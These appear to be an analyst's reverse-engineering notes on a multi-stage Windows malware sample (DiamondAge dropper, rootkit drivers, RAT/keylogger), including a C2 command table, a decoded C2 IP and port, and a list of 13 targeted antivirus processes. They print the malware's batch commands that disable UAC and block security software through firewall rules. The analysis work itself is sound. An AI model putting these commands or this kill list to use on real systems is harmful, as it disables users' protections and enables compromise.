sample.exe
FUN_00406a76 --> get_proc_address_dynamic
FUN_00406a06 --> load_system_dll
FUN_00406682 → copy_string_limited
FUN_00405f7e → find_char_in_string
FUN_00403614 → create_temp_working_directory
FUN_00406930 → sanitize_path
FUN_00405fc8 → is_valid_path_format
FUN_00405f51 → ensure_trailing_backslash
FUN_00405c30 → create_directory
FUN_004061a1 → generate_temp_filename
FUN_004030d5 → extract_and_validate_payload
  FUN_00405f9d → extract_filename_from_path
  FUN_004035e7 → read_file_chunk
    FUN_004061f5 -> read_file_with_validation
  FUN_00403033 → update_progress_dialog
  FUN_0040612d → copy_memory_backward
  FUN_00406b63 → calculate_crc32
  FUN_004035fd → set_file_pointer
  FUN_00406bd1 → initialize_data_structure
  FUN_00403376 → read_and_write_extracted_data
FUN_00405c4d → is_process_elevated
FUN_004066bf → resolve_installer_variables
FUN_00405bd6 → create_secure_directory
FUN_00406442 → move_file_with_fallback
FUN_00405c65 → execute_process
FUN_004069df → check_file_exists
FUN_00405d8e → delete_files_in_directory
FUN_00406059 → is_valid_directory
FUN_00403d54 → show_installer_dialog
FUN_00403c62 → cleanup_installer_files
FUN_00405ce2 → show_error_messagebox
FUN_0040140b → update_installer_progress

66VOAk0O.exe
FUN_100003b68 → d3d11_installer_thread
  FUN_1000038ac → parse_command_line_args
  FUN_100004134 → load_resource_string
  FUN_100004210 → show_dialog_box
  FUN_100006b50 → memset_zero
  FUN_100004478 → format_string_va
FUN_100005014 → exit_wrapper

D3D11InstallHelper.dll
  DoD3D11InstallUsingMSI
    1	Takes a key string and an output buffer
    2	Calls GetEnvironmentVariableW in a loop with growing buffer
    3	If buffer too small (error 0x7A = ERROR_INSUFFICIENT_BUFFER), doubles buffer size
    4	If value fits, converts from UTF-16 to the output format
    5	Returns the value or an error
    FUN_1800157d0 → Rust's env::var()


  CheckDirect3D11Status
    FUN_180025da0 → memcpy
    FUN_18000543a → Rust dealloc / drop
    FUN_1800061a0 → Rust String::new
    FUN_1800275f0 → Rust panic!()
    FUN_180026ae0 → Rust Slice Index Validation Panic
    FUN_1800056a5 → Rust Vec::with_capacity
    FUN_1800058da → Rust Vector/Array Index with Bounds Check
    FUN_1800054d1 → Rust Arc::clone
    FUN_1800052d2 → Rust Drop / Destructor for Error Types
    FUN_1800057f1 → Rust TLS Destructor Registration
    FUN_18001a5af → Rust std::io::Error::last_os_error()
    FUN_1800058fa → Rust's std::alloc::dealloc, Calls HeapFree
    FUN_180026ca0 → Rust unreachable!() Macro Handler
    FUN_18002696a → Rust Allocation Error Handler (OOM Abort)
    FUN_18001a34d → Rust Vec::reserve
    UN_180004745: THE FILE READER! file_reader
    FUN_1800052dc → Rust String::drop
    FUN_180014250 → Rust std::path::WindowsPath::parse
    it is the decryptor


payload_at_4841.bin
FUN_140019c40	Rust RNG seed	no Already know (same as DLL)
FUN_14001944c	CRT startup boilerplate	no Standard template
  FUN_14000b780 -> main_malware
    FUN_14000ce20 → log_message
    FUN_14000d100 → log_newline
    FUN_1400b44d0 → memset
    FUN_14000ea90 → log_error_code
    FUN_140090b94 → exit_process
    FUN_14000e870 → log_pointer
    FUN_140006310 → parse_date
    FUN_14008eef8 → timestamp_to_tm
    FUN_140015ab0 → internet_time_sync
    FUN_1400026b0 → check_360_process
    FUN_1400080a0 → configure_firewall
    FUN_140008f80 → bypass_defender
    FUN_1400074d0 → kill_av_processes
    FUN_140005dd0 → format_string
    FUN_14008e6a0 → wcscasecmp
    FUN_140009340 → inject_into_process
    FUN_1400917f0 → console_read_char
    FUN_1400035b0 → make_timestamp
    FUN_140002780 → format_date_string
    FUN_140001640 → panic_string_too_long
    FUN_1400b3cb0 → memcpy
    FUN_1400015a0 → panic_capacity_overflow
    FUN_1400038d0 → allocate_aligned
    FUN_14008e894 → gmtime_s
    FUN_1400013e0 → format_int
    FUN_140003070 → string_init
    FUN_140004fe0 → string_append
    FUN_1400a1eb0 → free
    FUN_140002610 → write_file
    FUN_1400040b0 → extract_zip
    FUN_1400042f0 → install_zip_contents
    FUN_140004d90 → string_concat
    FUN_140003220 → string_clear
    FUN_140003150 → string_init_from_bytes
    FUN_1400053d0 → create_directory_recursive
    FUN_1400032a0 → byte_string_clear
    FUN_140005170 → write_file_bytes
    FUN_140005e30 → install_vm_service
    FUN_140005a10 → install_minifilter_driver
    UN_14000b640 → start_vmservice
    FUN_14000b6e0 → start_minifilter
    FUN_14000a7a0 → execute_payload_loop
    FUN_140008470 → disable_dse
    FUN_140004750 → zip_entries_clear
    FUN_140018df0 → __security_check_cookie

    Data Address	Size Variable	Estimated Size	Purpose
    DAT_1400eb560	0x3F400	258,048 bytes	diamondage.dll, main payload
    DAT_14012a970	DAT_14012a960	~293,818 bytes	diamondage.exe, loader
    DAT_140152770	0xD3F6	54,262 bytes	goldendays.dll, service DLL
    DAT_140198390	0x7C0E9	507,113 bytes	Shellcode, injected into svchost
    DAT_140214480	0x47BBA	293,818 bytes	Another payload file
    DAT_14025c040	0xBEC	3,052 bytes	Code Integrity policy (.cip)
    DAT_14025cc40	DAT_14025cc30	Unknown	MiniFilter driver
    DAT_140269280	DAT_14025cc38	Unknown	vmservice.sys rootkit
    DAT_140277720	0x37840	227,392 bytes	VSS injection shellcode

    z0ltrak@z0ltrak-OMEN:~/MalWhere/samples/roning$ cd extracted/
    z0ltrak@z0ltrak-OMEN:~/MalWhere/samples/roning/extracted$ ls -la
    total 1732
    drwxr-x--- 2 z0ltrak z0ltrak 4096 Aug 3 13:41 .
    drwxrwxr-x 4 z0ltrak z0ltrak 4096 Aug 3 13:38 ..
    -rw-r----- 1 z0ltrak z0ltrak 3052 Aug 3 13:41 code_integrity.cip
    -rw-r----- 1 z0ltrak z0ltrak 1021 Aug 3 13:41 config_0x197f90.bin
    -rw-r----- 1 z0ltrak z0ltrak 259072 Aug 3 13:41 diamondage.dll
    -rw-r----- 1 z0ltrak z0ltrak 293818 Aug 3 13:41 diamondage.exe
    -rw-r----- 1 z0ltrak z0ltrak 54262 Aug 3 13:41 goldendays.dll
    -rw-r----- 1 z0ltrak z0ltrak 50752 Aug 3 13:41 minifilter_driver.sys
    -rw-r----- 1 z0ltrak z0ltrak 293818 Aug 3 13:41 payload_0x214480.bin
    -rw-r----- 1 z0ltrak z0ltrak 508137 Aug 3 13:41 svchost_shellcode.bin
    -rw-r----- 1 z0ltrak z0ltrak 51264 Aug 3 13:41 vmservice.sys
    -rw-r----- 1 z0ltrak z0ltrak 227392 Aug 3 13:41 vss_shellcode.bin
    z0ltrak@z0ltrak-OMEN:~/MalWhere/samples/roning/extracted$ file code_integrity.cip
    code_integrity.cip: data
    z0ltrak@z0ltrak-OMEN:~/MalWhere/samples/roning/extracted$ file config_0x197f90.bin
    config_0x197f90.bin: data
    z0ltrak@z0ltrak-OMEN:~/MalWhere/samples/roning/extracted$ file diamondage.dll
    diamondage.dll: PE32+ executable (DLL) (GUI) x86-64, for MS Windows, 6 sections
    z0ltrak@z0ltrak-OMEN:~/MalWhere/samples/roning/extracted$ file diamondage.exe
    diamondage.exe: PE32+ executable (GUI) x86-64, for MS Windows, 6 sections
    z0ltrak@z0ltrak-OMEN:~/MalWhere/samples/roning/extracted$ file goldendays.dll
    goldendays.dll: data
    z0ltrak@z0ltrak-OMEN:~/MalWhere/samples/roning/extracted$ file minifilter_driver.sys
    minifilter_driver.sys: PE32+ executable (native) x86-64, for MS Windows, 6 sections
    z0ltrak@z0ltrak-OMEN:~/MalWhere/samples/roning/extracted$ file payload_0x214480.bin
    payload_0x214480.bin: data
    z0ltrak@z0ltrak-OMEN:~/MalWhere/samples/roning/extracted$ file svchost_shellcode.bin
    svchost_shellcode.bin: data
    z0ltrak@z0ltrak-OMEN:~/MalWhere/samples/roning/extracted$ file vmservice.sys
    vmservice.sys: PE32+ executable (native) x86-64, for MS Windows, 6 sections
    z0ltrak@z0ltrak-OMEN:~/MalWhere/samples/roning/extracted$ file vss_shellcode.bin
    vss_shellcode.bin: PE32+ executable (native) x86-64, for MS Windows, 8 sections
    z0ltrak@z0ltrak-OMEN:~/MalWhere/samples/roning/extracted$


diamondage.dll
  FUN_180009aa4	rust_rng_init
  FUN_18000912c	rust_crt_dispatch
    FUN_180003030 → dll_main_handler
      FUN_1800029d0 → dll_cleanup
      FUN_180002b10 → dll_init
        FUN_1800052fc → install_api_hook
          FUN_180002890 → hook_nt_query_system_information
        FUN_1800051f8 → control_api_hooks
        FUN_180004ce4 → adjust_hooks_in_threads
        FUN_1800050d0 → toggle_api_hook
      FUN_18000ad30 → wcsrchr
      FUN_180011580 → wcscasecmp
      FUN_180002e80 → payload_launcher_thread
        FUN_180027c80 → memset
        FUN_180001560 → format_string
      FUN_180008b40 → __security_check_cookie
    FUN_1800090a8 → rust_dll_unload
  More functions:
  FUN_180001000 → set_hidden_process_name
  LAB_1800026b0 → hook_get_extended_tcp_table
  FUN_180001030 → set_payload_path
  FUN_1800011e0 → init_hidden_connection_table
  FUN_180004180 → add_hidden_connection
  FUN_180002420 → scan_and_hide_connections

diamondage.exe
  FUN_1400149f4 → main_logic
    FUN_140013314 → check_mutex
    FUN_140015248 → read_registry_config
    FUN_140005d90 → memset
    FUN_140015158 → write_registry_config
    FUN_1400189b4 → start_clipboard_monitor
    FUN_140013a94 → base64_decode

  FUN_140016a48 → c2_task_wrapper
  FUN_140014794 → c2_command_handler
    FUN_140017b84 → init_network_context
    FUN_140013574 → validate_ip_address
    FUN_140013424 → resolve_hostname
    FUN_140013644 → get_retry_delay
    FUN_140017ae4 → cleanup_network_context
    FUN_1400180c4 → connect_to_server
    FUN_140015f58 → init_transfer_context
    FUN_140014474 → collect_system_info
    FUN_140017a44 → disconnect_socket
    FUN_140013ea4 → handle_kill_flag
    FUN_1400132d4 → get_idle_status
    FUN_140017c74 → send_packet
    FUN_140015da8 → check_transfer_timeout
    FUN_140015de8 → cleanup_transfer

  FUN_140013d04 → background_thread
    FUN_1400173ac -> main_keylogger_loop
      FUN_140016f2c -> c2_keystrokes_sender

  The bytes at DAT_1400257a0 are:
  text
  
  53 51 53 4F 58 54 4F 50 50 4F 50 56 52 61 61 61 ...
  
  These are ALREADY XOR-encrypted with 0x61! Let's decode:
  text
  
  0x53 ^ 0x61 = 0x32 = '2'
  0x51 ^ 0x61 = 0x30 = '0'
  0x53 ^ 0x61 = 0x32 = '2'
  0x4F ^ 0x61 = 0x2E = '.'
  0x58 ^ 0x61 = 0x39 = '9'
  0x54 ^ 0x61 = 0x35 = '5'
  0x4F ^ 0x61 = 0x2E = '.'
  0x50 ^ 0x61 = 0x31 = '1'
  0x50 ^ 0x61 = 0x31 = '1'
  0x4F ^ 0x61 = 0x2E = '.'
  0x50 ^ 0x61 = 0x31 = '1'
  0x56 ^ 0x61 = 0x37 = '7'
  0x52 ^ 0x61 = 0x33 = '3'
  0x61 ^ 0x61 = 0x00 = '\0' (null terminator!)
  
  Decoded: 202.95.11.173

  z0ltrak@z0ltrak-OMEN:~$ whois 202.95.11.173
  curl -s https://ipinfo.io/202.95.11.173/json
  % [whois.apnic.net]
  % Whois data copyright terms http://www.apnic.net/db/dbcopyright.html
  
  % Information related to '202.95.0.0 - 202.95.31.255'
  
  % Abuse contact for '202.95.0.0 - 202.95.31.255' is 'abuse@ctgserver.net'
  
  inetnum: 202.95.0.0 - 202.95.31.255
  netname: RCPL-SG
  descr: RACKIP CONSULTANCY PTE. LTD.
  descr: No. 3, Pemimpin Drive, # 07-04 Lip Hing, Industrial Building,
  country: SG
  org: ORG-RCPL1-AP
  admin-c: RCPL3-AP
  tech-c: RCPL3-AP
  abuse-c: AC2487-AP
  status: ALLOCATED PORTABLE
  remarks: --------------------------------------------------------
  remarks: To report network abuse, please contact mnt-irt
  remarks: For troubleshooting, please contact tech-c and admin-c
  remarks: Report invalid contact via www.apnic.net/invalidcontact
  remarks: --------------------------------------------------------
  mnt-by: APNIC-HM
  mnt-lower: MAINT-RCPL-SG
  mnt-routes: MAINT-RCPL-SG
  mnt-irt: IRT-CTG-HK
  last-modified: 2024-08-23T02:28:56Z
  source: APNIC
  
  irt: IRT-CTG-HK
  address: 202,2/F Kam Sang BLDG 257,Des Voeux RD Central Hong Kong
  e-mail: abuse@ctgserver.net
  abuse-mailbox: abuse@ctgserver.net
  admin-c: RCPL3-AP
  tech-c: RCPL3-AP
  auth: # Filtered
  remarks: cs.mail@ctgserver.com
  remarks: abuse@ctgserver.net was validated on 2026-06-17
  mnt-by: MAINT-RCPL-SG
  last-modified: 2026-06-18T03:46:43Z
  source: APNIC
  
  organisation: ORG-RCPL1-AP
  org-name: RACKIP CONSULTANCY PTE. LTD.
  org-type: LIR
  country: SG
  address: No. 3, Pemimpin Drive, # 07-04 Lip Hing, Industrial Building,
  phone: +65 6255 8133
  fax-no: +65 6251 6559
  e-mail: abuse@rackip.com
  mnt-ref: APNIC-HM
  mnt-by: APNIC-HM
  last-modified: 2023-09-05T02:16:45Z
  source: APNIC
  
  role: ABUSE CTGHK
  country: ZZ
  address: 202,2/F Kam Sang BLDG 257,Des Voeux RD Central Hong Kong
  phone: +000000000
  e-mail: abuse@ctgserver.net
  admin-c: RCPL3-AP
  tech-c: RCPL3-AP
  nic-hdl: AC2487-AP
  remarks: Generated from irt object IRT-CTG-HK
  remarks: abuse@ctgserver.net was validated on 2026-06-17
  abuse-mailbox: abuse@ctgserver.net
  mnt-by: APNIC-ABUSE
  last-modified: 2026-06-18T03:46:42Z
  source: APNIC
  
  role: RACKIP CONSULTANCY PTE LTD administrator
  address: 399 Chai Wan Road, Chai Wan, Hong Kong
  country: SG
  phone: +603-7806-1316
  fax-no: +603-7806-1316
  e-mail: abuse@rackip.com
  admin-c: RCPL3-AP
  tech-c: RCPL3-AP
  nic-hdl: RCPL3-AP
  mnt-by: MAINT-RCPL-SG
  last-modified: 2021-08-30T06:13:42Z
  source: APNIC
  
  % Information related to '202.95.11.0/24AS152194'
  
  route: 202.95.11.0/24
  origin: AS152194
  descr: RACKIP CONSULTANCY PTE. LTD.
                  No. 3, Pemimpin Drive, #07-04 Lip Hing, Industrial Building,
  mnt-by: MAINT-RCPL-SG
  last-modified: 2024-03-31T12:45:18Z
  source: APNIC
  
  % Information related to '202.95.11.0/24AS64050'
  
  route: 202.95.11.0/24
  origin: AS64050
  descr: RACKIP CONSULTANCY PTE. LTD.
                  No. 3, Pemimpin Drive, #07-04 Lip Hing, Industrial Building,
  mnt-by: MAINT-RCPL-SG
  last-modified: 2023-10-12T04:00:58Z
  source: APNIC
  
  % This query was served by the APNIC Whois Service version 1.88.48 (WHOIS-UK2)
  
  
  {
    "ip": "202.95.11.173",
    "city": "Tung Chung",
    "region": "Islands",
    "country": "HK",
    "loc": "22.2878,113.9424",
    "org": "AS152194 CTG Server Limited",
    "postal": "999077",
    "timezone": "Asia/Hong_Kong",
    "readme": "https://ipinfo.io/missingauth"
  }

  Port 5552

  FUN_140017fb4 → receiver_thread
  FUN_140017de4 → process_c2_packet
  FUN_140016b48 → dispatch_c2_command
  
  Command	Function	Capability
  0x00	FUN_140015ed8	Set counter/flag
  0x01	: 	DISABLE (write Enable=False)
  0x02	: 	EXIT
  0x03	: 	Write Remark to registry
  0x04	: 	Write ZU to registry
  0x05	FUN_140015e58	Setup/config
  0x06	: 	Update config string (39 bytes)
  0x07	FUN_140015ff8	Download & Execute on desktop
  0x09	ShellExecuteA	Execute file (VISIBLE)
  0x0A	ShellExecuteA	Execute file (HIDDEN)
  0x23	FUN_1400168b8 → reflective loader	Load PE from memory
  0x25	FUN_1400168b8 → reflective loader	Load PE from memory
  0x70	FUN_140016778	Steal clipboard → send to C2
  0x71	: 	SET clipboard (crypto hijack!)
  0x7D	: 	cmd /c <command>
  0x7E	FUN_1400165c8	Unknown handler
  0x80	: 	Update CopyC config (Base64+XOR)
  0xEC	FUN_1400168b8 → reflective loader	Load PE from memory
  0xF1	FUN_1400169f8	Unknown handler
  0xF3	FUN_140015b18	Unknown handler
  0xF8	FUN_1400168b8 → reflective loader	Load PE from memory

  FUN_1400168b8 → dispatch_file_transfer
    FUN_140016478 → file_transfer_worker

    FUN_1400158d4 → load_pe_from_memory


FUN_1400158d4	load_pe_from_memory	Reflective PE loader, load DLL/EXE from memory
FUN_1400154c4	resolve_imports	Resolve DLL imports
FUN_140015654	fix_relocations	Fix base relocations
FUN_1400156f4	call_entry_point	Call DllMain
FUN_1400157e4	copy_sections	Copy PE sections


minifilter_driver.sys
  FUN_14000902c ->	init_security_cookie
  FUN_140001818 ->	DriverEntry
    FUN_140001444 → SetupCommunicationPort
    FUN_140001508 → CleanupCommPort
    FUN_140001380 → CommThread
    FUN_140001550 → MiniFilterIrpHandler: IOCTL COMMANDS!
    Supported IOCTL Codes
    IOCTL	Code	Operation
    0x222000	ADD_PATH	Add a file path to hide/protect
    0x222004	REMOVE_PATH	Remove a path (or clear all if PID=0xFFFFFFFF)
    0x222008	QUERY_PATH	Check if a path is protected
    0x22200C	UNKNOWN	Returns result of FUN_14000203c
    0x222010	UNKNOWN	Calls FUN_140001338


vmservice.sys
FUN_14000602c	init_security_cookie	Same GS cookie init
FUN_140001b9c	DriverEntry	Initialize driver
  FUN_140001c00	IRP Handler (IOCTL dispatch)
  FUN_140001698	Initialize (likely hooking engine)
  FUN_1400016d8	Create device + symbolic link
  FUN_140001ca4	Start main functionality
  FUN_140001000 → LoadImageNotifyRoutine
  Process Targets
  
  The driver checks if the loaded image is:
  Process	DLL to Inject
  explorer.exe	C:\ProgramData\DiamondAge\diamondage.dll
  taskmgr.exe	C:\ProgramData\DiamondAge\diamondage.dll
  perfmon.exe	C:\ProgramData\DiamondAge\diamondage.dll


config_1.bat, Disable UAC
batch

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f

Disables User Account Control (UAC)! This suppresses all elevation prompts.


config_2.bat, Block 360 Security via Firewall!
batch

:: Read target path from C:\ProgramData\lnk\123.txt
set filePath=C:\ProgramData\lnk\123.txt

:: Block 360tray.exe network access
netsh advfirewall firewall add rule name="Block Program Network Access"
    dir=in action=block program="%path%" enable=yes
netsh advfirewall firewall add rule name="Block Program Network Access"
    dir=out action=block program="%path%" enable=yes

:: Derive 360Safe.exe path from 360tray.exe path
:: "safemon\360tray.exe" → "360Safe.exe"

:: Block 360Safe.exe network access
netsh advfirewall firewall add rule name="Block Program Network Access2"
    dir=in action=block program="%path2%" enable=yes
netsh advfirewall firewall add rule name="Block Program Network Access2"
    dir=out action=block program="%path2%" enable=yes

:: Enable firewall
netsh advfirewall set allprofiles state on

:: Disable firewall notifications (hide from user!)
netsh advfirewall set privateprofile settings inboundusernotification disable
netsh advfirewall set publicprofile settings inboundusernotification disable
netsh advfirewall set domainprofile settings inboundusernotification disable


The Chinese Text

The garbled characters are GB2312/GBK encoded Chinese:

    �����ı��ļ�·�� = 设置文本文件路径 = "Set text file path"

    �ѳɹ���������ǽ������ֹ���������� = 已成功添加防火墙规则以阻止程序联网 = "Successfully added firewall rule to block program network access"


decompressed Goldendays.dll --> AV KILLER
Function	New Name	Purpose
FUN_1800010d0	register_kill_targets	Registers 13 process names to kill
FUN_180001000	kill_process_by_name	Finds process by name, calls TerminateProcess
Wow64LogInitialize (×4)	Export decoys	All return 0, fake Wow64 logging exports

List of Processes AV to kill:
s_ZhuDongFangYu.exe_1800167c0 XREF[1]: FUN_1800010d0:1800010dd(*)
1800167c0 5a 68 75 ds "ZhuDongFangYu.exe"
44 6f 6e
67 46 61
1800167d2 00 ?? 00h
1800167d3 00 ?? 00h
1800167d4 00 ?? 00h
1800167d5 00 ?? 00h
1800167d6 00 ?? 00h
1800167d7 00 ?? 00h
s_360Tray.exe_1800167d8 XREF[1]: FUN_1800010d0:1800010e9(*)
1800167d8 33 36 30 ds "360Tray.exe"
54 72 61
79 2e 65
1800167e4 00 ?? 00h
1800167e5 00 ?? 00h
1800167e6 00 ?? 00h
1800167e7 00 ?? 00h
s_360tray.exe_1800167e8 XREF[1]: FUN_1800010d0:180001101(*)
1800167e8 33 36 30 ds "360tray.exe"
74 72 61
79 2e 65
1800167f4 00 ?? 00h
1800167f5 00 ?? 00h
1800167f6 00 ?? 00h
1800167f7 00 ?? 00h
s_360Safe.exe_1800167f8 XREF[1]: FUN_1800010d0:1800010f5(*)
1800167f8 33 36 30 ds "360Safe.exe"
53 61 66
65 2e 65
180016804 00 ?? 00h
180016805 00 ?? 00h
180016806 00 ?? 00h
180016807 00 ?? 00h
s_HipsMain.exe_180016808 XREF[1]: FUN_1800010d0:18000110d(*)
180016808 48 69 70 ds "HipsMain.exe"
73 4d 61
69 6e 2e
180016815 00 ?? 00h
180016816 00 ?? 00h
180016817 00 ?? 00h
s_HipsDaemon.exe_180016818 XREF[1]: FUN_1800010d0:180001119(*)
180016818 48 69 70 ds "HipsDaemon.exe"
73 44 61
65 6d 6f
180016827 00 ?? 00h
s_HipsTray.exe_180016828 XREF[1]: FUN_1800010d0:180001125(*)
180016828 48 69 70 ds "HipsTray.exe"
73 54 72
61 79 2e
180016835 00 ?? 00h
180016836 00 ?? 00h
180016837 00 ?? 00h
s_QMToolWidget.exe_180016838 XREF[1]: FUN_1800010d0:180001131(*)
180016838 51 4d 54 ds "QMToolWidget.exe"
6f 6f 6c
57 69 64
180016849 00 ?? 00h
18001684a 00 ?? 00h
18001684b 00 ?? 00h
18001684c 00 ?? 00h
18001684d 00 ?? 00h
18001684e 00 ?? 00h
18001684f 00 ?? 00h
s_QQPCRTP.exe_180016850 XREF[1]: FUN_1800010d0:18000113d(*)
180016850 51 51 50 ds "QQPCRTP.exe"
43 52 54
50 2e 65
18001685c 00 ?? 00h
18001685d 00 ?? 00h
18001685e 00 ?? 00h
18001685f 00 ?? 00h
s_QQPCTray.exe_180016860 XREF[1]: FUN_1800010d0:180001149(*)
180016860 51 51 50 ds "QQPCTray.exe"
43 54 72
61 79 2e
18001686d 00 ?? 00h
18001686e 00 ?? 00h
18001686f 00 ?? 00h
s_kxecenter.exe_180016870 XREF[1]: FUN_1800010d0:180001155(*)
180016870 6b 78 65 ds "kxecenter.exe"
63 65 6e
74 65 72
18001687e 00 ?? 00h
18001687f 00 ?? 00h
s_kxetray.exe_180016880 XREF[1]: FUN_1800010d0:180001161(*)
180016880 6b 78 65 ds "kxetray.exe"
74 72 61
79 2e 65
18001688c 00 ?? 00h
18001688d 00 ?? 00h
18001688e 00 ?? 00h
18001688f 00 ?? 00h
s_kxemain.exe_180016890 XREF[1]: FUN_1800010d0:18000116d(*)
180016890 6b 78 65 ds "kxemain.exe"
6d 61 69
6e 2e 65
18001689c 00 ?? 00h
18001689d 00 ?? 00h
18001689e 00 ?? 00h
18001689f 00 ?? 00h

The 13 Targeted Processes
#	Process	Product
1	ZhuDongFangYu.exe	360 Active Defense (主动防御 = "Active Defense")
2	360Tray.exe	360 Total Security (tray, capitalized)
3	360tray.exe	360 Total Security (tray, lowercase)
4	360Safe.exe	360 Safe (main antivirus)
5	HipsMain.exe	360 HIPS (Host Intrusion Prevention)
6	HipsDaemon.exe	360 HIPS daemon
7	HipsTray.exe	360 HIPS tray
8	QMToolWidget.exe	Tencent PC Manager
9	QQPCRTP.exe	Tencent PC Manager (Real-Time Protection)
10	QQPCTray.exe	Tencent PC Manager (tray)
11	kxecenter.exe	Kingsoft Antivirus
12	kxetray.exe	Kingsoft Antivirus (tray)
13	kxemain.exe	Kingsoft Antivirus (main)
